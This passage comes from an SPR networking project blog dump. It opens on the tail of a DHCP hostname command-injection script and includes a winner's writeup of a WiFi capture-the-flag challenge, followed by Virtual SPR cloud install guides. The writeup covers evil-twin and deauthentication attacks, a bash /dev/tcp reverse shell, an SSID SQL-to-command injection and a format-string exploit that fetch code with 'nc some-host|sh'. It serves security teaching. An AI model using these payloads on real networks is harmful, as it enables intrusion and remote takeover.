Ether(src=station) / IP() / UDP(dport=67) / BOOTP(op=1) / DHCP(options=[\\n        (\'hostname\', f\'; {cmd} #\'),\\n    ])\\n    receiver = ap\\n    sender = station\\n    bssid = ap\\n    pkt = RadioTap() / Dot11(addr1=receiver, addr2=sender, addr3=bssid, FCfield=\'to-DS+protected\') / encrypt(inner_pkt)\\n    pkt.show()\\n    os.system(\'iw dev wlan1 interface add mon1 type monitor 2>/dev/null\')\\n    sendp(pkt, iface = \'mon1\', verbose = True)\\n\\nif __name__ == \'__main__\':\\n    main()\\n```\\n\\nThanks again to SPR, the challenge authors for putting out free educational content, you guys rock \ud83d\udc4f\ud83c\udffd\u270a\ud83c\udffd"},{"id":"january-2023-turtles","metadata":{"permalink":"/pages/blog/january-2023-turtles","source":"@site/blog/2023-02-15-turtles-jan.md","title":"January 2023\'s Turtles Challenge","description":"Editor\'s note:","date":"2023-02-15T00:00:00.000Z","formattedDate":"February 15, 2023","tags":[{"label":"Turtles","permalink":"/pages/blog/tags/turtles"},{"label":"CTF","permalink":"/pages/blog/tags/ctf"},{"label":"Hacking","permalink":"/pages/blog/tags/hacking"},{"label":"WiFi","permalink":"/pages/blog/tags/wi-fi"},{"label":"EvilTwin","permalink":"/pages/blog/tags/evil-twin"},{"label":"Deauthentication","permalink":"/pages/blog/tags/deauthentication"}],"readingTime":8.745,"hasTruncateMarker":false,"authors":[{"name":"Amy","url":"https://twitter.com/itszn13","key":"Amy"}],"frontMatter":{"slug":"january-2023-turtles","title":"January 2023\'s Turtles Challenge","authors":"Amy","tags":["Turtles","CTF","Hacking","WiFi","EvilTwin","Deauthentication"]},"unlisted":false,"prevItem":{"title":"March 2023\'s Turtles Challenge","permalink":"/pages/blog/spr-turtles-march"},"nextItem":{"title":"Run Virtual SPR on a Google Cloud Free Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance"}},"content":"#### Editor\'s note:\\n\\n\\nThe Turtles WiFi challenges are a series of ctf-style problems concerning network and wifi security skills.\\nWe first ran a challenge in this style at [Stockholm\'s Midnight Sun CTF Finals in August \'22 at the Turtles MidnightSun Finals](https://github.com/spr-networks/turtles-midnightsunctf-2022-finals). You can play along with January\'s challenge, with the [github repository](https://github.com/spr-networks/turtles-january-23).\\n\\nJanuary\'s winner, [Amy](https://twitter.com/itszn13) from [Ret2 Systems](https://ret2.io/), has kindly let us share their challenge writeup. Congratulations! And thanks again for putting this writeup together.\\n\\nFebruary\'s contest will be released on the 20th and we will be giving out more raspberry pis!\\n\\n## Intro\\n\\nWe find ourselves in a twisting maze of WLANs. There are 5 machines connected across several WLAN networks. We start as root on the first machine and must move laterally across the network to exfiltrate 3 flag files.  From our box we can connect to an access point with the SSID \\"jan-turtle1\\".\\n\\n![](/img/xturtles_jan.png)\\n\\n## Flag 1\\nOur first target is also connected to the \\"jan-turtle1\\" AP over WPA3. We can assume that the target may be doing something interesting over this network, so performing a MitM attack may be fruitful. To pull this off we can use the so-called [\\"Evil Twin Attack\\"](https://en.wikipedia.org/wiki/Evil_twin_(wireless_networks)) where we impersonate the AP.\\n\\nFirst we need to set up our own AP with the same SSID and configuration as the existing \\"jan-turtle1\\" AP. I used `hostapd` to do this with the following config:\\n\\n```\\ninterface=wlan2\\ndriver=nl80211\\nhw_mode=a\\nchannel=40\\nssid=jan-turtle1\\nwpa=2\\nwpa_key_mgmt=SAE\\nwpa_pairwise=CCMP\\nap_isolate=1\\nsae_password=sn0wt0rt0ise\\n```\\n\\n```bash\\nip addr add dev wlan2 192.168.1.1/24\\nhostapd -B /root/h.conf\\n```\\n\\nOnce we have the AP up and running, clients looking for the real \\"jan-turtle1\\" AP may connect to our malicious AP instead. However the target is already connected to the existing AP, so it won\'t attempt to reconnect to our AP.\\n\\nLuckily we can force it off of the original AP by abusing [deauthentication packets](https://en.wikipedia.org/wiki/Wi-Fi_deauthentication_attack). If we send these packets with a spoofed target address, we cause the target to disconnect. Once the client has disconnected, there is a chance that they will reconnect to our malicious access point. We can use [`aireplay-ng`](https://www.aircrack-ng.org/doku.php?id=aireplay-ng) to perform this attack on a second WLAN:\\n```bash\\nip link set dev wlan3 up\\nyes | airmon-ng start wlan3 40\\n# Start deauth on target MAC\\naireplay-ng -0 10 -a 02:00:00:00:00:00 -c 02:00:00:00:01:00 wlan3mon &\\n```\\n\\n```\\n# tcpdump -i wlan2 -v\\n06:09:53  Waiting for beacon frame (BSSID: 02:00:00:00:00:00) on channel 40\\n06:09:53  Sending 64 directed DeAuth (code 7). STMAC: [02:00:00:00\\ntcpdump: listening on wlan2, link-type EN10MB (Ethernet), snapshot length 262144 bytes\\n06:10:01.225272 02:00:00:00:01:00 (oui Unknown) > Broadcast Null Unnumbered, xid, Flags [Response], length 6: 01 00\\n06:10:08.879191 ARP, Ethernet (len 6), IPv4 (len 4), Request who-has 192.168.1.1 tell 192.168.1.2, length 28\\n06:10:08.879228 ARP, Ethernet (len 6), IPv4 (len 4), Reply 192.168.1.1 is-at 02:00:00:00:02:00 (oui Unknown), length 28\\n08:35:14.868587 IP (tos 0x0, ttl 64, id 18623, offset 0, flags [DF], proto TCP (6), length 60)\\n    192.168.1.2.49070 > 192.168.1.1.http: Flags [S], cksum 0x27e2 (correct), seq 547073709, win 64240, options [mss 1460,sackOK,TS val 3350547164 ecr 0,nop,wscale 7], length 0\\n06:10:08.879473 IP (tos 0x0, ttl 64, id 0, offset 0, flags [DF], proto TCP (6), length 40)\\n    192.168.1.1.http > 192.168.1.2.49070: Flags [R.], cksum 0x9d34 (correct), seq 0, ack 547073710, win 0, length 0\\n```\\nLooks like there is a unencrypted HTTP request! Lets host our own http server using python:\\n```\\n# python3 -m http.server 80\\nServing HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/)\\n192.168.1.2 - - [15/Feb/2023 06:17:06] \\"GET /install.sh HTTP/1.1\\" 404 -\\n192.168.1.2 - - [15/Feb/2023 06:17:16] code 404, message File not found\\n```\\nIf we create our own `install.sh`, it looks like the box will run it! Lets get a reverse shell\\n```bash\\nbash -i >& /dev/tcp/192.168.1.1/1337 0>&1\\n```\\nNice, we captured the first flag!\\n```\\nListening on 0.0.0.0 1337\\nConnection received on 192.168.1.2 47550\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@2d419af9c243:/# cat flag1.txt\\nturtles{0f004d8e004f4577952eda915426eac38f4df6b4}\\nroot@2d419af9c243:/#\\n```\\n\\n## Flag 2\\n\\nFor the second stage, we are given a binary named [`wardriver`](https://en.wikipedia.org/wiki/Wardriving) which is running on the second target. This binary has two main features. First it used `iw dev <dev> scan` to collect information on all near by access points.\\n\\n```c\\nint getData() {\\n  __snprintf_chk(command, 256LL, 1LL, 256LL, \\"iw dev %s scan\\", (const char *)IFACE);\\n  if ( fopen(\\"scan.txt\\", \\"r\\") )\\n    strcpy(command, \\"cat scan.txt\\");\\n  v0 = popen(command, \\"r\\");\\n  insert(v0);\\n  ...\\n  sqlite3_exec(v7, v8, 0LL, 0LL);\\n}\\n__int64 __fastcall insert(...) {\\n  ...\\n  __snprintf_chk(\\n        v8, 256LL, 1LL, 256LL,\\n        \\"INSERT INTO wifis VALUES(%d, \'%s\', \'%s\', \'%s\');\\",\\n        _id, bss_str, ssid_str, signal_str,\\n    );\\n}\\n```\\n\\nIf we create an malicious AP, the SSID will be formatted into this INSERT command. We can use this to perform an SQL insert injection into the database, allowing us to control any field of a new entry to the `wifis` table.\\n\\nNext we look at the second functionality. The binary will periodically dump values from the table and send them as data using a curl command:\\n\\n```c\\n__int64 dump() {\\n  ...\\n  v0 = sqlite3_exec(v3, \\"SELECT * FROM wifis\\", callback, 0LL);\\n  ...\\n}\\n__int64 __fastcall callback(...) {\\n...\\n  if ( bss_str && signal_str ) {\\n    __snprintf_chk(\\n      command, 128LL, 1LL, 128LL,\\n      \\"curl %s --data \\\\\\"{\\\\\\\\\\\\\\"bss\\\\\\\\\\\\\\": \\\\\\\\\\\\\\"%s\\\\\\\\\\\\\\", \\\\\\\\\\\\\\"signal\\\\\\\\\\\\\\": \\\\\\\\\\\\\\"%s\\\\\\\\\\\\\\"}\\\\\\"\\",\\n      \\"http://127.0.0.1:8080/logs\\",\\n      bss_str, signal_str);\\n    system(command);\\n    return 0LL;\\n  }\\n  return 1LL;\\n}\\n```\\n\\nWe can see that there is no sanitization of the `bss` or `signal` columns when formatted into the command. We can trigger command injection here by creating a malicious wifi entry using the SQL injection in the previous function. The length of command injection in the SSID is limited, so I fetched a second stage from a remote host. Here is the `hostapd` config with the SQL injection payload:\\n```sql\\ninterface=wlan4\\ndriver=nl80211\\nhw_mode=a\\nchannel=48\\nssid=\',\'\'),(2,\'`nc some-host 9|sh`\',\'\\nwpa=2\\nwpa_key_mgmt=SAE\\nwpa_pairwise=CCMP\\nap_isolate=1\\nsae_password=shred_the_gnar_pow\\n```\\n\\nAfter a few seconds the wardriver picks up our AP and we get a connect back on the second target!\\n```\\n$ nc -l 1338 -v\\nListening on 0.0.0.0 1338\\nConnection received on 192.168.1.2 58580\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@b976e8a2f52b:/# cat flag2.txt\\ncat flag2.txt\\nturtles{f0c03d9e242a89f1df51e5da9a833750398fe989}\\nroot@b976e8a2f52b:/#\\n```\\n\\n## Flag 3\\nFor the final target, we need to exploit an SOAP Server running on the second AP. Our second target box is already authenticated to the AP, so we can easily talk to the server directly.\\n\\nDecompiling the binary, we see that it is a simple HTTP server which implements a few parts of the [SOAP protocol](https://en.wikipedia.org/wiki/SOAP). We can perform a some actions such as listing the server uptime or date.\\n\\nThe first bug I found was in an error handler. This handler uses the `http_response` function to build a response with HTTP code 400. However for the body pointer, it mistakenly passes a `void**` pointer instead of a `char*` ptr. This will leak the address of the `soap_action` function as well as a stack address in the body of the 400 response.\\n```c\\nint __cdecl http_response(...) {\\n  fprintf(stream, \\"HTTP/1.1 %d %s\\\\r\\\\n\\", a2, a3);\\n  fwrite(\\"Server: OS/Version UPnP/1.0 product/version\\", 1u, 0x2Bu, stream);\\n  fwrite(\\"Content-Type: text/html\\\\r\\\\n\\", 1u, 0x19u, stream);\\n  fwrite(\\"Connection: close\\\\r\\\\n\\", 1u, 0x13u, stream);\\n  fwrite(\\"\\\\r\\\\n\\", 1u, 2u, stream);\\n  fprintf(stream, \\"<HTML><HEAD><TITLE>%d %s</TITLE></HEAD>\\\\n<H4>%d %s</H4>\\\\n\\", a2, a3, a2, a3);\\n  ...\\n}\\nunsigned int __cdecl handle_client(int fd) {\\n  void* __soap_action_ = soap_action;\\n  char *v7;\\n  char buf[2048];\\n  v7 = &buf;\\n  if ( _isoc99_sscanf(...) ) {\\n    ...\\n    __soap_action(steam);\\n  } else {\\n    http_response(stream, 400, \\"Invalid request\\", (const char *)&__soap_action_)\\n  }\\n}\\n```\\nWe can trigger this leak with the following code:\\n```python\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nsock.connect((HOST, PORT))\\n\\nsock.sendall(b\'ENDEND a\\\\n\')\\nleak = (sock.recv(4096).split(b\'request</H4>\\\\n\',1)[1]\\n\\t\\t.split(b\'ENDEND\',1)[0].ljust(8,b\'\\\\0\'))\\ntext_leak = u32(leak[:4])\\nstack_leak = u32(leak[4:])\\n\\nsock.close()\\n```\\n\\nLooking closer at the string functions being used, there are several buffer overflows from calls to `sprintf` and `strcpy`. However almost all of these are protected by stack-cookies. Luckily there is a single case where a pointer lays between a buffer and the stack-cookie:\\n\\n```c\\n__int64 __cdecl soap_response(...) {\\n  char dest[2048];\\n  char src[2048];\\n  char* format_str;\\n  unsigned int cookie;\\n  ...\\n  format_str = \\"%s\\";\\n  ...\\n  sprintf(&src[off], \\"%s\\", sub_action);\\n  ...\\n  sprintf(&src[off], format_str, action);\\n}\\n```\\n\\nSince we are able to buffer overflow `src` using the first `sprintf` call, we can smash the `format_str` ptr. This allows point `format_str` at our own data on the stack (using the leak from earlier), giving us an arbitrary [format string vulnerability](https://en.wikipedia.org/wiki/Uncontrolled_format_string).\\n\\nWe can easily exploit the format string by using the `%123$hhn` syntax. This syntax will write the number of bytes printed so far as a `uint8_t` at a given offset on the stack. This is very handy as we can use it to surgically corrupt a return pointer without messing with the stack-cookie.\\n\\nAt this point we can control the EIP register, but we still need to actually get code execution. There is an easy way to do this by abusing the calls to `system` in the binary. We can partially corrupt the return address to point it to the following address in the binary:\\n```\\n.text:00001A76                 call    system\\n.text:00001A7B                 add     esp, 10h\\n.text:00001A7E                 sub     esp, 8\\n```\\nThe first argument of system will be the next value pointed to by ESP, which just so happens to be our format string from before. We can simply prepend our format string exploit with a command to run!\\n\\n```python\\n# Prep return byte overwrite targets\\ng1 = 0x76\\ng2 = ((text_leak & 0xf000) >> 8) + 0xa\\n\\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\\nsock.connect((HOST, PORT))\\n\\npl = b\'post / a\\\\nSOAPAction: \'\\npl += b\'numberwang#wangernum42\'\\n\\n# Place write targets on the stack\\npl += p32(target_stack_ret)\\npl += p32(target_stack_ret+1)\\n# Padding\\npl += b\'EEEE\'\\npl += b\'FFFF\'\\npl += b\'A\'*(1824-4*4)\\n# Smash format ptr\\npl += p32(stack_leak)\\npl += b\'\\\\n\\\\n\'\\n\\n# Command to run in system\\nfmt = \'nc some-host 10|sh;#\'\\n\\n# Format string exploit\\nfmt +=  f\'%{g1-len(fmt)}c\'+\'%592$hhn\'+f\'%{g2-g1}c\'+\'%593$hhn\'\\npl += fmt.encode(\'latin-1\')\\n\\nsock.sendall(pl)\\n```\\n\\nWith this exploit ready to go, we can run it from the second target box. Once the exploit lands we are greeted with our last reverse shell and get the last flag!\\n\\n```\\n$ nc -l 1339 -v\\nListening on 0.0.0.0 1339\\nConnection received on 192.168.1.2 14253\\nbash: cannot set terminal process group (8): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@21fbbf871fa0:/# cat flag3.txt\\nturtles{c14583540ce6a34f73cb04d964aff18415916fae}\\nroot@21fbbf871fa0:/#\\n```\\n\\n\\n#### Editor\'s note:\\n\\nChallenge 3 is based on a flaw the Supernetworks team exploited in preparation for December\'s pwn2own contest against the Netgear RAX30. Oddly enough: the soapd binary has FORTIFY_SOURCE enabled, yet still has some stray sprintfs, and does in fact store the format string on the stack like that, for unclear reasons."},{"id":"virtual-spr-on-a-gcloud-tier-free-instance","metadata":{"permalink":"/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance","source":"@site/blog/2022-10-13-virtual-spr-gcloud.md","title":"Run Virtual SPR on a Google Cloud Free Tier Instance","description":"Introduction","date":"2022-10-13T00:00:00.000Z","formattedDate":"October 13, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"},{"label":"Google Cloud","permalink":"/pages/blog/tags/google-cloud"}],"readingTime":2.48,"hasTruncateMarker":false,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo"}],"frontMatter":{"slug":"virtual-spr-on-a-gcloud-tier-free-instance","title":"Run Virtual SPR on a Google Cloud Free Tier Instance","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard","Google Cloud"]},"unlisted":false,"prevItem":{"title":"January 2023\'s Turtles Challenge","permalink":"/pages/blog/january-2023-turtles"},"nextItem":{"title":"Run Virtual SPR on a AWS Micro Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-aws-micro-tier-instance"}},"content":"## Introduction\\n\\nThis guide shows how to setup a new E2 instance in Google Cloud, allow VPN access in firewall and install Virtual SPR.\\nThe result is a private VPN with a custom DNS server able to block ads, log traffic, and more [features](/docs/intro#the-service-listing) included in SPR.\\n\\nFor a more general and in-depth guide see the [Virtual SPR Guide](/blog/virtual%20SPR).\\n\\n## Setup Account\\n\\n[Skip](#create-instance) this section if you already have an Google Cloud account & a project setup.\\n\\nGo to [Google Cloud](https://cloud.google.com) & sign in with a Google account, or create a new one and enable Google Cloud.\\nGoogle have a [Free Tier](https://cloud.google.com/free/) where you get $300 in free credits when signing up as a new customer.\\nContinue by creating a Payment Profile.\\n\\nWhen done click **New Project** in the top menu dropdown and pick a name for your project.\\n\\n## Create Instance\\n\\n![](/img/gcloud-1.png)\\n\\nIn the top navigation menu go to **Compute Engine** and click **VM Instances**.\\n\\nClick **Enable** if you haven\'t used the service before. If promped to create a project, pick a name for it & click **Create**.\\n\\nClick **Create Instance**.\\n\\n![](/img/gcloud-2.png)\\n\\nSelect a name for your instance & pick a region.\\n\\nFor Series go with E2 and *Machine type* for the least expensive alternative.\\n\\nUnder *Boot disk* click **Change**:\\n\\n![](/img/gcloud-3.png)\\n\\nSelect and save:\\n* Operating System **Ubuntu**\\n* Version **Ubuntu 22.04 LTS** *x86/64*\\n\\nExpand *Advanced options*, then *Networking*, scroll down to *Network interfaces* and click **default**.\\nSelect *External IPv4 address* and click **Create IP address** to assign a static IP address for your instance.\\n\\n![](/img/gcloud-6.png)\\n\\nThe default settings is fine for the other options.\\nNow click **Create** to boot up the instance.\\n\\n## Firewall rules for VPN access\\n\\nIn the navigation go to **VPC Network** and click **Firewall**. Click **Create Firewall Rule** at the top of the page.\\n\\n![](/img/gcloud-5.png)\\n\\nSettings in screenshot:\\n* Name **allow-wireguard**\\n* Diretion of Traffic **ingress**\\n* Network **default**\\n* Targets **All instances in the network** *all is fine, specify a target if you run more instances*\\n* Source Filter **IP ranges**\\n* Source IP Ranges 0.0.0.0/0 *or if you know the range you will be connecting from*\\n* Protocols and Ports **UDP** and **51280**\\n* Second Source filter **None**\\n\\n*Note: This only allows connections to the instance, WireGuard will authorize clients when connecting*.\\n\\n## Access instance & install SPR\\n\\nYour instance should be available under *Compute Engine* -> *VM Instances*.\\nClick **SSH** in the listing:\\n\\n![](/img/gcloud-4.png)\\n\\nA browser window should popup with a terminal.\\nRun the SPR virtual installer with sudo:\\n\\n```sh\\nsudo bash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\n\\nCheck out the source for `virtual_install.sh` [here](https://github.com/spr-networks/super).\\n\\nIf you want to add another device, just run the setup script again:\\n```sh\\ncd super\\nsudo ./virtual_install.sh\\n```\\n\\nNow you have a WireGuard VPN config ready, either scan the QR Code or paste the config into the [WireGuard client](https://www.wireguard.com/install/).\\n\\nFor more information on setting up the client see [the Virtual SPR Guide](/blog/virtual%20SPR#configure-the-vpn-client-on-your-device) on how to connect your VPN client to the instance."},{"id":"virtual-spr-on-a-aws-micro-tier-instance","metadata":{"permalink":"/pages/blog/virtual-spr-on-a-aws-micro-tier-instance","source":"@site/blog/2022-10-07-virtual-spr-aws.md","title":"Run Virtual SPR on a AWS Micro Tier Instance","description":"Introduction","date":"2022-10-07T00:00:00.000Z","formattedDate":"October 7, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"},{"label":"AWS","permalink":"/pages/blog/tags/aws"}],"readingTime":2.115,"hasTruncateMarker":false,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo"}],"frontMatter":{"slug":"virtual-spr-on-a-aws-micro-tier-instance","title":"Run Virtual SPR on a AWS Micro Tier Instance","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard","AWS"]},"unlisted":false,"prevItem":{"title":"Run Virtual SPR on a Google Cloud Free Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-gcloud-tier-free-instance"},"nextItem":{"title":"Run Virtual SPR on a DigitalOcean Droplet","permalink":"/pages/blog/virtual-spr-on-a-digital-ocean-droplet"}},"content":"## Introduction\\n\\nThis guide shows how to setup Virtual SPR on a Micro Tier Instance on AWS, and connect to it using WireGuard VPN.\\n\\nThe result is a private VPN with a custom DNS server able to block ads, log traffic, and more features included in SPR.\\n\\nFor a more general and in-depth guide see the [Virtual SPR Guide](/blog/virtual%20SPR).\\n\\n## Create a Instance\\n\\nSign in to [AWS Console](https://console.aws.amazon.com/ec2/home) and navigate to *Instances* in the menu.\\nClick **Launch Instances** for your selected region.\\n\\n![](/img/aws-1.png)\\n\\nName your instance and select Ubuntu and 64-bit (x86) as architecture under OS Images.\\n\\nFor instance type choose any micro tier eligible for free, t2.micro is used in the example.\\n\\n![](/img/aws-2.png)\\n\\nIf you already have a keypair that you want to use, select it under *Key pair* or click **Create new key pair**, save the .pem-file to your ~/.ssh directory and make sure only your user can read it.\\n\\n### Allow VPN access\\n\\nUnder *Network settings* click **Edit** and scroll down to **Add security group rule**.\\nSelect UDP & port 5128, \\"vpn\\" as description and if you want to allow access from a specific source ip or range.\\n\\n![](/img/aws-3.png)\\n\\nClick **Launch Instance** in the bottom right.\\n\\n## Install Virtual SPR\\n\\nNavigate to *Instances*, the newly created instance should be available in the listing and shown as Running, click it.\\nCopy the value under Public IPv4 address and ssh into the box as the ubuntu user:\\n\\n```sh\\nssh -i ~/.ssh/awsspr.pem ubuntu@paste-ipv4-address-here\\n```\\n\\n*NOTE* You can also use the *Instance Connect*-feature if you don\'t have access to a ssh client. Click **Connect** under the *Instance Summary* to get access to a terminal.\\n\\nRun the SPR virtual installer with sudo:\\n\\n```sh\\nsudo bash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\n\\n*NOTE: If the script cannot get the public ip address of the instance from one of the network interfaces, it will ask to fetch this from https://ifconfig.me.\\nAnswer yes to fetch this or edit this later (**Endpoint** in the WireGuard config).*\\n\\nThe script will download the [SPR repository](https://github.com/spr-networks/super) and run *virtual_install.sh* (you can also checkout the [repository](https://github.com/spr-networks/super) and run the script manually if you want to inspect the script before running it.)\\n\\nIf you want to add another device, just run the setup script again:\\n```sh\\ncd super\\nsudo ./virtual_install.sh\\n```\\n\\nNow you have a WireGuard VPN config ready, either scan the QR Code or paste the config into the [WireGuard client](https://www.wireguard.com/install/).\\n\\nFor more information on setting up the client see [the Virtual SPR Guide](/blog/virtual%20SPR#configure-the-vpn-client-on-your-device) on how to connect your VPN client to the instance."},{"id":"virtual-spr-on-a-digital-ocean-droplet","metadata":{"permalink":"/pages/blog/virtual-spr-on-a-digital-ocean-droplet","source":"@site/blog/2022-10-03-virtual-spr-do.md","title":"Run Virtual SPR on a DigitalOcean Droplet","description":"Introduction","date":"2022-10-03T00:00:00.000Z","formattedDate":"October 3, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"},{"label":"DigitalOcean","permalink":"/pages/blog/tags/digital-ocean"}],"readingTime":1.32,"hasTruncateMarker":false,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo"}],"frontMatter":{"slug":"virtual-spr-on-a-digital-ocean-droplet","title":"Run Virtual SPR on a DigitalOcean Droplet","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard","DigitalOcean"]},"unlisted":false,"prevItem":{"title":"Run Virtual SPR on a AWS Micro Tier Instance","permalink":"/pages/blog/virtual-spr-on-a-aws-micro-tier-instance"},"nextItem":{"title":"SPR in the cloud","permalink":"/pages/blog/virtual SPR"}},"content":"## Introduction\\n\\nThis guide shows how to setup Virtual SPR on a DigitalOcean Droplet and connect to it using WireGuard VPN.\\n\\nFor a more general and in-depth guide see the [Virtual SPR Guide](/blog/virtual%20SPR).\\n\\n## Create a Droplet\\n\\nLogin to [DigitalOcean](https://cloud.digitalocean.com) and click *Create Droplet*.\\n\\n![](/img/cloud-digital-ocean-1.png)\\n\\nSelect prefered Region and Datacenter (*Amsterdam* and *AMS3* in the example),\\ngo with default *Ubuntu 22.04 x64* for OS and version.\\n\\nFor Droplet Size, the smallest *$4/month* Basic with 512 MB RAM is enough but feel free to choose another one.\\n\\n![](/img/cloud-digital-ocean-2.png)\\n\\nIf you already have a ssh key configured for a project you can choose the pubkey or click *New SSH Key* for *Choose Authentication Method*.\\n\\nClick *Create Droplet* & wait for it to spin up.\\n\\n![](/img/cloud-digital-ocean-3.png)\\n\\n## Install Virtual SPR\\n\\nWhen the droplet has started, copy the ipv4 address and ssh into the box using your ssh key as root:\\n```sh\\nssh -i .ssh/id_rsa root@paste-ipv4-address-here\\n```\\n\\nRun the SPR virtual installer as root on the droplet:\\n```sh\\nbash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\nThe script will download the [SPR repository](https://github.com/spr-networks/super) and run *virtual_install.sh* (you can also checkout the [repository](https://github.com/spr-networks/super) and run the script manually if you want to inspect the script before running it.)\\n\\nIf you want to add another device, just run the setup script again:\\n```sh\\ncd super\\n./virtual_install.sh\\n```\\n\\nNow you have a WireGuard VPN config ready, either scan the QR Code or paste the config into the [WireGuard client](https://www.wireguard.com/install/).\\n\\nFor more information on setting up the client see [the Virtual SPR Guide](/blog/virtual%20SPR#configure-the-vpn-client-on-your-device) on how to connect your VPN client to the droplet instance."},{"id":"virtual SPR","metadata":{"permalink":"/pages/blog/virtual SPR","source":"@site/blog/2022-09-07-virtual-spr.md","title":"SPR in the cloud","description":"Introduction","date":"2022-09-07T00:00:00.000Z","formattedDate":"September 7, 2022","tags":[{"label":"SPR","permalink":"/pages/blog/tags/spr"},{"label":"Virtual","permalink":"/pages/blog/tags/virtual"},{"label":"Cloud","permalink":"/pages/blog/tags/cloud"},{"label":"VPN","permalink":"/pages/blog/tags/vpn"},{"label":"WireGuard","permalink":"/pages/blog/tags/wire-guard"}],"readingTime":3.17,"hasTruncateMarker":false,"authors":[{"name":"Philip Olausson","url":"https://twitter.com/capslcc","key":"ltspo"}],"frontMatter":{"slug":"virtual SPR","title":"SPR in the cloud","authors":"ltspo","tags":["SPR","Virtual","Cloud","VPN","WireGuard"]},"unlisted":false,"prevItem":{"title":"Run Virtual SPR on a DigitalOcean Droplet","permalink":"/pages/blog/virtual-spr-on-a-digital-ocean-droplet"},"nextItem":{"title":"Securely Chaining Routers","permalink":"/pages/blog/secure router chaining"}},"content":"## Introduction\\n\\nThis guide will show how to setup virtual SPR and connect to it using a WireGuard VPN client from your phone or desktop computer.\\n\\nThe result is a private VPN with a custom DNS server able to block ads, log traffic, and more.\\n\\n**Quick install**\\n```sh\\nsudo bash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\nOpen WireGuard & scan the QR Code/import config - Done!\\n\\n## Virtual SPR Install\\n\\n**What you need**\\n* A linux server running Ubuntu 22.04\\n* If there is a firewall *port 51280/udp* needs to be open for incoming traffic\\n* [WireGuard](https://www.wireguard.com/install/) (*\xa9 Jason A. Donenfeld*) installed on your client phone or desktop\\n\\t* `apt install wireguard` for ubuntu\\n\\t* Official clients for [Windows](https://download.wireguard.com/windows-client/wireguard-installer.exe), [macOS](https://itunes.apple.com/us/app/wireguard/id1451685025?ls=1&mt=12), [iOS](https://itunes.apple.com/us/app/wireguard/id1441195209?ls=1&mt=8), [Android](https://play.google.com/store/apps/details?id=com.wireguard.android)\\n\\n**Run Virtual Installer**\\n```sh\\nsudo bash -c \\"$(curl -fsSL https://raw.github.com/spr-networks/super/master/virtual_install.sh)\\"\\n```\\n\\n**What the script does**\\n* downloads the latest SPR repository from https://github.com/spr-networks/super/\\n* downloads prebuilt docker images\\n* generate default configs\\n* setup admin password and auth token for API access\\n* start SPR\\n* add a VPN peer and output the WireGuard config\\n\\nYou can also download the script if you want to check it out or add blocklists for ads:\\n```sh\\ncurl -s -O https://raw.githubusercontent.com/spr-networks/super/main/virtual_install.sh\\nchmod +x virtual_install.sh\\nsudo DNS_BLOCK=hosts,ads,tracking,redirects ./virtual_install.sh\\n```\\n\\nSee [here](https://github.com/blocklistproject/Lists) for available blocklists.\\n\\nExample to block DNS requests to adservers and social media:\\n```sh\\nsudo DNS_BLOCK=ads,tracking,facebook,tiktok ./virtual_install.sh\\n````\\n\\nIf you want to change the admin password you can edit the file `configs/base/auth_users.json`\\n\\nRunning the script you should see login info, a QR Code & the WireGuard client config. Example:\\n\\n```sh\\n...\\n[+] WireGuard config: (save this as wg.conf & import in client)\\n----------------------------------------------------------\\n\\n[Interface]\\nPrivateKey = privkey\\nAddress = 192.168.2.94\\nDNS = 192.168.2.1\\n\\n[Peer]\\nPublicKey = pubkey\\nAllowedIPs = 0.0.0.0/0, ::/0\\nEndpoint = 198.211.120.224:51280\\nPersistentKeepalive = 25\\nPresharedKey = psk\\n```\\n\\nIf you want to connect to the VPN using a desktop client, save the config as wg.conf on your local computer.\\n\\n## Configure the VPN client on your device\\n\\n**For iOS and Android**\\n\\nScan the QR Code in the official WireGuard App ([iOS](https://itunes.apple.com/us/app/wireguard/id1441195209?ls=1&mt=8), [Android](https://play.google.com/store/apps/details?id=com.wireguard.android)) to import your VPN profile.\\n\\n**Linux, macOS and Windows**\\n\\nClick *\\"Add empty tunnel...\\"* paste the config and set a name for the tunnel. Or, if you saved the config to a file:\\n\\n* Open your WireGuard client and click *\\"Import tunnel(s) from file\\"*\\n* Select the wg.conf file\\n* Click Activate\\n\\n## Admin interface\\n\\n![](/img/screenshot_login.png)\\n\\nMake sure you\'re connected to the VPN 